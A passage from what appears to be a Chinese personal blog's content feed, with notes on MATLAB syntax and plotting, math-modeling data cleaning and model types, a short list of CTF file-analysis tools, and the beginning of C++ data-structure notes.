定义结构体（python的dict）</span></span><br><span class="line">dic = struct(key,value[,key,value,...])</span><br><span class="line"><span class="comment">% 取值</span></span><br><span class="line">dic.key <span class="comment">% 取cell</span></span><br><span class="line">dic.key(n) <span class="comment">% 取cell</span></span><br><span class="line">dic.key&#123;n&#125; <span class="comment">% 取value</span></span><br><span class="line"><span class="comment">% 案例</span></span><br><span class="line">dic = struct(<span class="string">&#x27;name&#x27;</span>,&#123;&#123;<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>&#125;)</span><br><span class="line">dic.name <span class="comment">% &#x27;a&#x27; &#x27;b&#x27;</span></span><br><span class="line">dic.name(<span class="number">1</span>) <span class="comment">% &#x27;a&#x27;</span></span><br><span class="line">dic.name&#123;<span class="number">1</span>&#125; <span class="comment">% a</span></span><br></pre></td></tr></table></figure><h3 id="2-逻辑流程"><a href="#2-逻辑流程" class="headerlink" title="2 逻辑流程"></a>2 逻辑流程</h3><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% for循环</span></span><br><span class="line"><span class="keyword">for</span> var = start:step:<span class="keyword">end</span></span><br><span class="line">...;</span><br><span class="line">...;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">% step步长不写默认1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% while</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">exp</span></span><br><span class="line">...;</span><br><span class="line">...;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% if...else</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">exp</span></span><br><span class="line">...;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">...;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% switch...case</span></span><br><span class="line"><span class="keyword">switch</span> num/str</span><br><span class="line"><span class="keyword">case</span> num/str</span><br><span class="line">...;</span><br><span class="line"><span class="keyword">case</span> num/str</span><br><span class="line">...;</span><br><span class="line"><span class="keyword">otherwise</span></span><br><span class="line">...;</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="3-函数"><a href="#3-函数" class="headerlink" title="3 函数"></a>3 函数</h3><h4 id="3-1-数学函数"><a href="#3-1-数学函数" class="headerlink" title="3.1 数学函数"></a>3.1 数学函数</h4><ol><li><p>幂函数：$x^n$</p><p><code>x^n</code></p></li><li><p>指数函数：$a^x$，$e^x$</p><p><code>a^x exp(x)</code></p></li><li><p>对数函数：$ln x$</p><p><code>log(x)</code></p></li><li><p>三角函数：$tan(x)$</p><p><code>tan(x)</code></p></li><li><p>反三角函数：$arcsin(x)$</p><p><code>asin(x)</code></p></li></ol><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 求和</span></span><br><span class="line">sum()</span><br><span class="line"><span class="comment">% 求平均值</span></span><br><span class="line"><span class="built_in">mean</span>()</span><br><span class="line"><span class="comment">% 累加</span></span><br><span class="line">cumsum()</span><br><span class="line"></span><br><span class="line"><span class="comment">% 解方程</span></span><br><span class="line">solve(<span class="string">&#x27;exp1&#x27;</span>,<span class="string">&#x27;exp2&#x27;</span>,...,<span class="string">&#x27;var1&#x27;</span>,<span class="string">&#x27;var2&#x27;</span>,...)</span><br><span class="line"><span class="comment">% sinx + x = 0</span></span><br><span class="line">solve(<span class="string">&#x27;sin(x)+x=0&#x27;</span>)</span><br><span class="line">solve(<span class="string">&#x27;sin(X)+x&#x27;</span>)</span><br><span class="line"><span class="comment">% 方程组 x^2 + x*y + y = 3;x^2 - 4*x + 3 = 0;</span></span><br><span class="line">[x,y]=solve(<span class="string">&#x27;x^2 + x*y + y = 3&#x27;</span>,<span class="string">&#x27;x^2 - 4*x + 3 = 0&#x27;</span>)</span><br></pre></td></tr></table></figure><h4 id="3-2-随机数"><a href="#3-2-随机数" class="headerlink" title="3.2 随机数"></a>3.2 随机数</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% m行n列(0-1)的随机数，mn和矩阵大小要一致</span></span><br><span class="line"><span class="built_in">rand</span>(m,n)</span><br><span class="line"><span class="built_in">rand</span>(m,n,<span class="string">&#x27;double&#x27;</span>) <span class="comment">% 指定精度，参数：&#x27;double&#x27;,&#x27;single&#x27;</span></span><br><span class="line"><span class="built_in">rand</span>(RandStream,m,n) <span class="comment">% 随机种子</span></span><br><span class="line"><span class="comment">% 标准正态分布的伪随机数（均值0，方差1）</span></span><br><span class="line"><span class="built_in">randn</span>(m,n)</span><br><span class="line"><span class="comment">% 均匀分布的伪随机整数（指定上限（值包括上限），下限默认0）</span></span><br><span class="line">randi(iMax)</span><br><span class="line">randi(iMax,m,n)</span><br><span class="line">randi([iMin,iMax],m,n)</span><br></pre></td></tr></table></figure><h4 id="3-3-操作函数"><a href="#3-3-操作函数" class="headerlink" title="3.3 操作函数"></a>3.3 操作函数</h4><blockquote><p><a href="https://zhuanlan.zhihu.com/p/64018906">神奇的数学—幻方的智慧 - 知乎 (zhihu.com)</a></p></blockquote><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 排序</span></span><br><span class="line"><span class="built_in">sortrows</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">% 生成n阶单位矩阵</span></span><br><span class="line"><span class="built_in">eye</span>(n)</span><br><span class="line"><span class="comment">% 生成n阶段幻方</span></span><br><span class="line"><span class="built_in">magic</span>(n)</span><br></pre></td></tr></table></figure><h4 id="3-4-查找函数"><a href="#3-4-查找函数" class="headerlink" title="3.4 查找函数"></a>3.4 查找函数</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 读取矩阵行列数</span></span><br><span class="line"><span class="built_in">size</span>()</span><br><span class="line"><span class="comment">% 读取矩阵维数</span></span><br><span class="line"><span class="built_in">length</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">% 矩阵查找A中大于num的数，行存入m，列存入n</span></span><br><span class="line">[m,n] = <span class="built_in">find</span>(mat &gt; num)</span><br></pre></td></tr></table></figure><h4 id="3-5-样式函数"><a href="#3-5-样式函数" class="headerlink" title="3.5 样式函数"></a>3.5 样式函数</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 美化输出格式（更像数学格式）</span></span><br><span class="line">pretty(dy)</span><br><span class="line">symdisp(dy)</span><br></pre></td></tr></table></figure><h3 id="4-文件"><a href="#4-文件" class="headerlink" title="4 文件"></a>4 文件</h3><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 读excel</span></span><br><span class="line">xlsread(file,sheet,range)</span><br><span class="line">A = xlsread(<span class="string">&#x27;data.xls&#x27;</span>,<span class="string">&#x27;附件1&#x27;</span>,<span class="string">&#x27;A4:E322&#x27;</span>)</span><br><span class="line"><span class="comment">% 写excel</span></span><br><span class="line">xlswrite()</span><br><span class="line"><span class="comment">% 读图片</span></span><br><span class="line">imread()</span><br></pre></td></tr></table></figure><h3 id="5-matlab命令"><a href="#5-matlab命令" class="headerlink" title="5 matlab命令"></a>5 matlab命令</h3><h4 id="5-1-屏幕命令"><a href="#5-1-屏幕命令" class="headerlink" title="5.1 屏幕命令"></a>5.1 屏幕命令</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 清屏</span></span><br><span class="line">clc</span><br><span class="line"><span class="comment">% 清内存</span></span><br><span class="line">clear</span><br></pre></td></tr></table></figure><h4 id="5-2-数学命令"><a href="#5-2-数学命令" class="headerlink" title="5.2 数学命令"></a>5.2 数学命令</h4><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 内置命令</span></span><br><span class="line"><span class="comment">% 求导，偏导（n：阶）</span></span><br><span class="line">diff(f,x,n)</span><br><span class="line"><span class="comment">% 定积分，重积分</span></span><br><span class="line">int()</span><br><span class="line"><span class="comment">% 泰勒展开</span></span><br><span class="line">taylor()</span><br><span class="line"><span class="comment">% 常微分方程</span></span><br><span class="line">dsolve()</span><br></pre></td></tr></table></figure><hr><h2 id="三、绘图"><a href="#三、绘图" class="headerlink" title="三、绘图"></a>三、绘图</h2><h3 id="1-二维绘图"><a href="#1-二维绘图" class="headerlink" title="1 二维绘图"></a>1 二维绘图</h3><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 建立一个幕布</span></span><br><span class="line"><span class="built_in">figure</span></span><br><span class="line"></span><br><span class="line"><span class="comment">% 普通画图</span></span><br><span class="line"><span class="built_in">plot</span>(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 标题</span></span><br><span class="line">title(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line"><span class="comment">% x轴名，y轴名 </span></span><br><span class="line">xlabel(<span class="string">&#x27;str&#x27;</span>)/ylabel(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line"><span class="comment">% 限制x轴范围</span></span><br><span class="line">xlim([start <span class="keyword">end</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">% 设置案例</span></span><br><span class="line"><span class="comment">% 共用一个x在y上有不同取值</span></span><br><span class="line">[AX,H1,H2] = plotyy(x,y1,x,y2)</span><br><span class="line"><span class="comment">% 设置属性</span></span><br><span class="line">set(get(AX(<span class="number">1</span>),<span class="string">&#x27;Ylabel&#x27;</span>),<span class="string">&#x27;String&#x27;</span>,<span class="string">&#x27;Slow Decay&#x27;</span>)</span><br><span class="line">set(get(AX(<span class="number">2</span>),<span class="string">&#x27;Ylabel&#x27;</span>),<span class="string">&#x27;String&#x27;</span>,<span class="string">&#x27;Fast Decay&#x27;</span>)</span><br><span class="line">set(H1,<span class="string">&#x27;LineStyle&#x27;</span>,<span class="string">&#x27;--&#x27;</span>)</span><br><span class="line">set(H1,<span class="string">&#x27;LineStyle&#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 散点图</span></span><br><span class="line"><span class="built_in">scatter</span>(x,y)</span><br><span class="line"><span class="comment">% 同一张图中画多条线（标签区分）</span></span><br><span class="line"><span class="built_in">legend</span>()</span><br></pre></td></tr></table></figure><ul><li><strong>线与点</strong></li></ul><p><img src="/posts/a66872a2/颜色.png" alt="颜色"></p><p><img src="/posts/a66872a2/点与线.png" alt="点与线"></p><h3 id="2-三维绘图"><a href="#2-三维绘图" class="headerlink" title="2 三维绘图"></a>2 三维绘图</h3><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"><span class="comment">% 三维画图</span></span><br><span class="line"><span class="built_in">plot3</span>(x,y,z)</span><br><span class="line"></span><br><span class="line"><span class="comment">% z标签</span></span><br><span class="line">zlable(<span class="string">&#x27;str&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">% 等待后再绘制</span></span><br><span class="line"><span class="built_in">hold</span> on/off</span><br><span class="line"><span class="comment">% 网格线</span></span><br><span class="line">grid on/off</span><br><span class="line"><span class="comment">% 背景轴立方化</span></span><br><span class="line">axis square</span><br></pre></td></tr></table></figure><hr><h1 id="模型算法"><a href="#模型算法" class="headerlink" title="模型算法"></a>模型算法</h1><h2 id="一、数据处理"><a href="#一、数据处理" class="headerlink" title="一、数据处理"></a>一、数据处理</h2><blockquote><p><a href="https://www.spsspro.com/analysis/operation/5910327">SPSSPRO</a></p><p><a href="https://blog.csdn.net/weixin_44390462/article/details/105565901">利用python对一份AQI数据进行分析与预测</a></p></blockquote><h3 id="1-缺失值"><a href="#1-缺失值" class="headerlink" title="1 缺失值"></a>1 缺失值</h3><ol><li><p>比赛提供的数据，发现有些单元格是null或空的。</p></li><li><p>缺失太多：例如调查人口信息，发现“年龄”这一项缺失了40%，就直接把该项指标删除</p></li><li><p>最简单处理：均值、众数插补</p><ul><li>定量数据，例如关于一群人的身高、年龄等数据，用整体的均值来补缺失</li><li>定性数据，例如关于一群人的性别、文化程度；某些事件调查的满意度，用出现次数最多的值补缺失</li><li><strong>适用赛题</strong>：<strong>人口的数量年龄、经济产业情况等统计数据，对个体精度要求不大的数据</strong></li></ul></li><li><p>Newton插值法</p><ul><li>根据固定公式，构造近似函数，补上缺失值，普遍适用性强</li><li>缺点：区间边缘处的不稳定震荡，即龙格现象。不适合对导数有要求的题目</li><li><strong>适用赛题：热力学温度、地形测量、定位等只追求函数值精准而不关心变化的数据</strong></li></ul></li><li><p>样条插值法</p><ul><li>用分段<strong>光滑</strong>的曲线去插值，光滑意味着曲线不仅连续，还要有连续的曲率</li><li><strong>适用赛题</strong>：<strong>零件加工，水库水流量，图像“基线漂移”，机器人轨迹等精度要求高、没有突变的数据</strong></li></ul></li></ol><h3 id="2-异常值"><a href="#2-异常值" class="headerlink" title="2 异常值"></a>2 异常值</h3><ol><li><p>样本中明显和其他数值差异很大的数据，例如一群人的身高数据中有个3米2的</p></li><li><p>正态分布3σ原则</p><ul><li>数值分布在（μ-3σ,μ+3σ)中的概率为99.73%，其中μ为平均值，σ为标准差</li><li>求解步骤：1.计算均值μ和标准差σ；2.判断每个数据值是否在（μ-3σ,μ+3σ)内，不在则为异常值</li><li><strong>适用题目：总体符合正态分布，例如人口数据、测量误差、生产加工质量、考试成绩等。</strong></li><li><em>不适用题目：总体符合其他分布，例如公交站人数排队论符合泊松分布。*</em></li></ul></li><li><p>画箱型图</p><ul><li>箱型图中，把数据<strong>从小到大</strong>排序。下四分位数𝑄1是排第25%的数值，上四分位数𝑄3是排第75%的数值</li><li>四分位距𝐼𝑄𝑅 = 𝑄3- 𝑄1，也就是排名第75%的减去第25%的数值</li><li>与正态分布类似，设置个<strong>合理区间</strong>，在<strong>区间外的就是异常值</strong></li><li>一般设[𝑄1 − 1.5 ∗ 𝐼𝑄𝑅, 𝑄3 + 1.5 ∗ 𝐼𝑄𝑅]内为正常值</li><li><strong>适用题目：普遍适用</strong></li></ul></li><li><p>异常数据处理方法与缺失值处理相同。</p></li></ol><h3 id="3-处理函数"><a href="#3-处理函数" class="headerlink" title="3 处理函数"></a>3 处理函数</h3><blockquote><p><a href="https://ww2.mathworks.cn/help/matlab/ref/fillmissing.html?searchHighlight=fillmissing&amp;s_tid=srchtitle_fillmissing_1">fillmissing</a></p><p><a href="https://ww2.mathworks.cn/help/matlab/ref/filloutliers.html?searchHighlight=filloutliers&amp;s_tid=srchtitle_filloutliers_1">filloutliers</a></p></blockquote><figure class="highlight matlab"><table><tr><td class="code"><pre><span class="line"># 缺失值插补</span><br><span class="line">F = fillmissing(A,method)</span><br><span class="line"># 异常值插补</span><br><span class="line">B = filloutliers(A,fillmethod,findmethod)</span><br></pre></td></tr></table></figure><hr><h2 id="二、模型建立"><a href="#二、模型建立" class="headerlink" title="二、模型建立"></a>二、模型建立</h2><h3 id="1-线性规划"><a href="#1-线性规划" class="headerlink" title="1 线性规划"></a>1 线性规划</h3><blockquote><p>在一组线性约束条件的限制下，求一线性目标函数的最大或最小值的问题。</p><p>例：两个车间生产A、B机床，限制条件不同，求最大利润。</p></blockquote><h3 id="2-整数规划"><a href="#2-整数规划" class="headerlink" title="2 整数规划"></a>2 整数规划</h3><blockquote><p>规定变量部分或全部限制为整数。</p><p>全限制为完全整数规划，部分限制为混合整数规划。</p></blockquote><h3 id="3-非线性规划"><a href="#3-非线性规划" class="headerlink" title="3 非线性规划"></a>3 非线性规划</h3><blockquote><p>约束条件或目标函数包含非线性函数。</p><p>例：投资决策</p></blockquote><h3 id="4-动态规划"><a href="#4-动态规划" class="headerlink" title="4 动态规划"></a>4 动态规划</h3><blockquote><p>选或不选，得到最佳答案。</p><p>例：生产调度，资源分配</p></blockquote><h3 id="5-图与网络"><a href="#5-图与网络" class="headerlink" title="5 图与网络"></a>5 图与网络</h3><blockquote><p>图题</p><p>例：最短路径，公路连通。</p></blockquote><h3 id="6-排队论"><a href="#6-排队论" class="headerlink" title="6 排队论"></a>6 排队论</h3><blockquote><p>排队模型。</p></blockquote><h3 id="7-对策论"><a href="#7-对策论" class="headerlink" title="7 对策论"></a>7 对策论</h3><blockquote><p>博弈论。</p><p>例：囚徒困境。</p></blockquote><h3 id="8-层次分析法"><a href="#8-层次分析法" class="headerlink" title="8 层次分析法"></a>8 层次分析法</h3><blockquote><p>逐级分析问题。</p><p>例：假期旅游（目的地——路上选择——具体措施）</p></blockquote><h3 id="9-插值和拟合"><a href="#9-插值和拟合" class="headerlink" title="9 插值和拟合"></a>9 插值和拟合</h3><blockquote><p>插值：求过已知有限个数据点的近似函数。</p><p>拟合：近似函数可以不过数据点，总偏差最小即可。</p></blockquote><h3 id="10-数理统计"><a href="#10-数理统计" class="headerlink" title="10 数理统计"></a>10 数理统计</h3><blockquote><p>大数据分析。</p><p>例：学生的身高体重。</p></blockquote><h3 id="11-方差分析"><a href="#11-方差分析" class="headerlink" title="11 方差分析"></a>11 方差分析</h3><blockquote><p>检验两个以上总体的均值彼此是否相等。</p><p>例：灯泡的品质。</p></blockquote><h3 id="12-回归分析"><a href="#12-回归分析" class="headerlink" title="12 回归分析"></a>12 回归分析</h3><blockquote><p>拟合的函数是否满足预测要求。</p></blockquote><h3 id="13-微分方程建模"><a href="#13-微分方程建模" class="headerlink" title="13 微分方程建模"></a>13 微分方程建模</h3><blockquote><p>问题中存在需要计算微分的地方。</p><p>例：多级火箭问题。</p></blockquote><h3 id="19-神经网络"><a href="#19-神经网络" class="headerlink" title="19 神经网络"></a>19 神经网络</h3><blockquote><p><a href="https://blog.csdn.net/baoliang12345/article/details/128065676">BP神经网络预测回归MATLAB代码</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> Python </tag>
            
            <tag> 数学建模 </tag>
            
            <tag> Matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件工具知识</title>
      <link href="/posts/a2cc6fde.html"/>
      <url>/posts/a2cc6fde.html</url>
      
        <content type="html"><![CDATA[<h1 id="File工具"><a href="#File工具" class="headerlink" title="File工具"></a>File工具</h1><blockquote><p><a href=".\71be2b51">text::文件理论</a></p></blockquote><hr><h2 id="一、二进制文件工具"><a href="#一、二进制文件工具" class="headerlink" title="一、二进制文件工具"></a>一、二进制文件工具</h2><h3 id="1-010Editor"><a href="#1-010Editor" class="headerlink" title="1 010Editor"></a>1 010Editor</h3><blockquote><p>文件二进制</p></blockquote><ul><li><p>模板使用</p><blockquote><p><a href="https://www.sweetscape.com/010editor/repository/templates/">模板大全</a></p><p><a href="https://blog.csdn.net/freeking101/article/details/102908538">模板开发</a></p></blockquote></li><li><p>内存粘贴</p><blockquote><p>Edit → Copy As → Copy As Hex Text</p><p>编辑 - 粘贴至 - 十六进制</p></blockquote></li></ul><h3 id="2-WinHex"><a href="#2-WinHex" class="headerlink" title="2 WinHex"></a>2 WinHex</h3><blockquote><p>文件二进制</p></blockquote><hr><h2 id="二、二维码工具"><a href="#二、二维码工具" class="headerlink" title="二、二维码工具"></a>二、二维码工具</h2><h3 id="1-ClearImage"><a href="#1-ClearImage" class="headerlink" title="1 ClearImage"></a>1 ClearImage</h3><blockquote><p> 多种图片识别</p><p><a href="https://download.cnet.com/Clear-Image-Demo/3000-2070_4-75453197.html">下载</a></p></blockquote><h3 id="2-CQR"><a href="#2-CQR" class="headerlink" title="2 CQR"></a>2 CQR</h3><blockquote><p>二维码识别</p></blockquote><hr><h2 id="三、声音工具"><a href="#三、声音工具" class="headerlink" title="三、声音工具"></a>三、声音工具</h2><h3 id="1-AU"><a href="#1-AU" class="headerlink" title="1 AU"></a>1 AU</h3><blockquote><p>声波</p></blockquote><hr><h2 id="四、视频工具"><a href="#四、视频工具" class="headerlink" title="四、视频工具"></a>四、视频工具</h2><h3 id="1-PotPlayer"><a href="#1-PotPlayer" class="headerlink" title="1 PotPlayer"></a>1 PotPlayer</h3><blockquote><p>flash文件</p></blockquote><hr><h2 id="五、文本工具"><a href="#五、文本工具" class="headerlink" title="五、文本工具"></a>五、文本工具</h2><h3 id="1-PDF解密"><a href="#1-PDF解密" class="headerlink" title="1 PDF解密"></a>1 PDF解密</h3><blockquote><p> <a href="https://smallpdf.com/cn/unlock-pdf">PDF解密 - 免费的在线PDF密码移除软件 (smallpdf.com)</a></p></blockquote><hr><h2 id="六、图片工具"><a href="#六、图片工具" class="headerlink" title="六、图片工具"></a>六、图片工具</h2><blockquote><p><a href="https://docsmall.com/image-compress">在线图片压缩 - docsmall 在线图片压缩工具,在线图片压缩软件</a></p></blockquote><h3 id="1-Stegsolve"><a href="#1-Stegsolve" class="headerlink" title="1 Stegsolve"></a>1 Stegsolve</h3><blockquote><p>查看图片隐写</p></blockquote><h3 id="2-Stegdetect"><a href="#2-Stegdetect" class="headerlink" title="2 Stegdetect"></a>2 Stegdetect</h3><blockquote><p>检测特殊隐写</p></blockquote><hr><h2 id="七、压缩文件工具"><a href="#七、压缩文件工具" class="headerlink" title="七、压缩文件工具"></a>七、压缩文件工具</h2><h3 id="1-360Zip"><a href="#1-360Zip" class="headerlink" title="1 360Zip"></a>1 360Zip</h3><blockquote><p>压缩工具</p></blockquote><h3 id="2-ARCHPR"><a href="#2-ARCHPR" class="headerlink" title="2 ARCHPR"></a>2 ARCHPR</h3><blockquote><p>压缩包爆破</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 文件分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构与算法</title>
      <link href="/posts/4b0178e0.html"/>
      <url>/posts/4b0178e0.html</url>
      
        <content type="html"><![CDATA[<h1 id="数据结构与算法"><a href="#数据结构与算法" class="headerlink" title="数据结构与算法"></a>数据结构与算法</h1><h1 id="C-数据结构与算法"><a href="#C-数据结构与算法" class="headerlink" title="C++数据结构与算法"></a>C++数据结构与算法</h1><blockquote><p><a href="https://github.com/Magialeaf/Course/tree/main/Data_Structure">my::数据结构与算法</a></p><p><a href="https://blog.csdn.net/xiezhi123456/article/details/90141172">指针的引用</a></p><p><a href="https://www.cs.usfca.edu/~galles/visualization/Algorithms.html">可视化数据结构与算法(usfca.edu)</a></p></blockquote><hr><h2 id="〇、绪论"><a href="#〇、绪论" class="headerlink" title="〇、绪论"></a>〇、绪论</h2><h3 id="1-数据结构"><a href="#1-数据结构" class="headerlink" title="1 数据结构"></a>1 数据结构</h3><ul><li>术语<ul><li>数据：信息的载体。</li><li>数据元素：数据的基本单位，由若干个数据项组成。</li><li>数据对象：同性质元素集合。</li><li>数据类型：原子类型，结构类型，抽象数据类型（类）。</li></ul></li><li>数据结构三要素<ul><li>逻辑结构：线性结构，非线性结构。</li><li>存储结构：顺序存储，链式存储，索引存储，散列存储。</li></ul></li></ul><h3 id="2-算法"><a href="#2-算法" class="headerlink" title="2 算法"></a>2 算法</h3><ul><li>算法评估<ul><li>性质：有穷性，确定性，可行性，输入，输出。</li><li>好算法：正确性，可读性，健壮性，高效率与低储存量。</li><li>时间复杂度：T( n ) = O( f(n) )</li><li>时间复杂度数学定义：若 T(n) 和 f(n) 是定义再正整数集合上的两个函数，则存在正常数 C 和 n0，使得当 n &gt;= n0 时，都满足 0 &lt;= T(n) &lt;= Cf(n)</li><li>时间复杂度比较：<code>O(1) &lt; O(log2n) &lt; O(n) &lt; O(nlog2n) &lt; O(n**2) &lt; O(n**3) &lt; O(2**n) &lt; O(n!) &lt; O(n**n)</code></li><li>空间复杂度：S( n ) = O( g( n ) )，即辅助空间。</li></ul></li></ul><hr><h2 id="一、线性表"><a href="#一、线性表" class="headerlink" title="一、线性表"></a>一、线性表</h2><h3 id="1-线性表"><a href="#1-线性表" class="headerlink" title="1 线性表"></a>1 线性表</h3><blockquote><p>线性存储的一种数据结构。</p></blockquote><ul><li><p>线性表</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 静态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;elem[],length&#125;;</span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;*data,length&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 初始化，O(1)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitList</span><span class="params">(SqList&amp; L)</span></span>;</span><br><span class="line"><span class="comment">// 返回线性表长，O(1)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Length</span><span class="params">(SqList L)</span></span>;</span><br><span class="line"><span class="comment">// 按值查找，O(n)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">LocateElem</span><span class="params">(SqList L, ElemType e)</span></span>;</span><br><span class="line"><span class="comment">// 按位查找，注意超界，O(1)</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetElem</span><span class="params">(SqList L, <span class="type">int</span> i)</span></span>;</span><br><span class="line"><span class="comment">// 插入，判断i，判断空间是否剩余，后续元素后移，O( n )</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListInsert</span><span class="params">(SqList&amp; L,<span class="type">int</span> i,ElemType e)</span></span>;</span><br><span class="line"><span class="comment">// 删除，判断i，后续元素前移，O(n)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ListDelete</span><span class="params">(SqList&amp; L,<span class="type">int</span> i,ElemType&amp; e)</span></span>;</span><br><span class="line"><span class="comment">// 打印，遍历，O(n)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">PrintList</span><span class="params">(SqList L)</span></span>;</span><br><span class="line"><span class="comment">// 判空，长度，O(1)</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Empty</span><span class="params">(SqList L)</span></span>;</span><br><span class="line"><span class="comment">// 摧毁，长度置0，O(1)</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyList</span><span class="params">(SqList&amp; L)</span></span>;</span><br></pre></td></tr></table></figure></li></ul><h3 id="2-链表"><a href="#2-链表" class="headerlink" title="2 链表"></a>2 链表</h3><blockquote><p>线性存储数据，存储的数据地址不连续。</p></blockquote><ul><li><p>单链表</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;data,*next&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 头插法逆向初始化单链表，先创建头结点，再输入值，O(n)</span></span><br><span class="line"><span class="function">LinkList <span class="title">List_HeadInsert</span><span class="params">(LinkList &amp;L)</span></span>;</span><br><span class="line"><span class="comment">// 尾插法正向初始化，需要尾指针，其他同逆向，尾指针最后置空，O(n)</span></span><br><span class="line"><span class="function">LinkList <span class="title">List_TailInsert</span><span class="params">(LinkList &amp;L)</span></span>;</span><br><span class="line"><span class="comment">// 下标查找结点，O(n)</span></span><br><span class="line"><span class="function">Lode* <span class="title">GetElem</span><span class="params">(LinkList L,<span class="type">int</span> i)</span></span>;</span><br><span class="line"><span class="comment">// 值查找结点，O(n)</span></span><br><span class="line"><span class="function">Lode* <span class="title">LocateElem</span><span class="params">(LinkList L,ElemType e)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 原地插入删除 O(1)，查找结点再插入删除O(n)，求表长 O(n)。</span></span><br><span class="line"><span class="comment">// 删除插入某个结点的前一结点是 O(n)。</span></span><br></pre></td></tr></table></figure></li><li><p>双向链表</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 动态</span></span><br><span class="line"><span class="keyword">struct</span> &#123;data,*next,*prior&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 函数</span></span><br><span class="line"><span class="comment">// 便于找到前驱结点，更好地插入和删除。</span></span><br></pre></td></tr></table></figure></li><li><p>循环链表</p><ul><li><p>循环单链表</p><blockquote><p>基本同理，但判空条件不是 *next 指向 null ， 而是是否等于头指针。（指向头结点）</p></blockquote></li><li><p>循环双链表</p><blockquote><p>基本同理，空表时 <em>next 和 </em>prior 都指向头结点。</p></blockquote></li></ul></li><li><p>静态链表</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义</span></span><br><span class="line"><span class="comment">// 指针是数据下标（游标），其他同理。</span></span><br><span class="line"><span class="built_in">struct</span>()&#123;data,next&#125;;</span><br><span class="line"><span class="comment">// next 是下一元素的数组下标，next == -1 为结束标记</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="3-一元多项式"><a href="#3-一元多项式" class="headerlink" title="3 一元多项式"></a>3 一元多项式</h3><blockquote><p>用计算机表示一元多项式。</p></blockquote><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">LNode</span>&#123;</span><br><span class="line">    <span class="type">float</span> coef; <span class="comment">// 系数</span></span><br><span class="line">    <span class="type">int</span> expn; <span class="comment">// 指数</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">LNode</span>* next; <span class="comment">// 链表下一项</span></span><br><span class="line">&#125;pnode, *polynomial;</span><br></pre></td></tr></table></figure><hr><h2 id="二、栈、队列和数组"><a href="#二、栈、队列和数组" class="headerlink" title="二、栈、队列和数组"></a>二、栈、队列和数组</h2><h3 id="1-栈"><a href="#1-栈" class="headerlink" title="1 栈"></a>1 栈</h3><blockquote><p>先进后出的线性表。</p></blockquote><ul><li><p>特性</p><ul><li>卡特兰数：n 个不同元素进栈，出栈可能是 1 / ( n + 1 ) * C( 2n , n )</li></ul></li><li><p>顺序栈</p><figure class="highlight 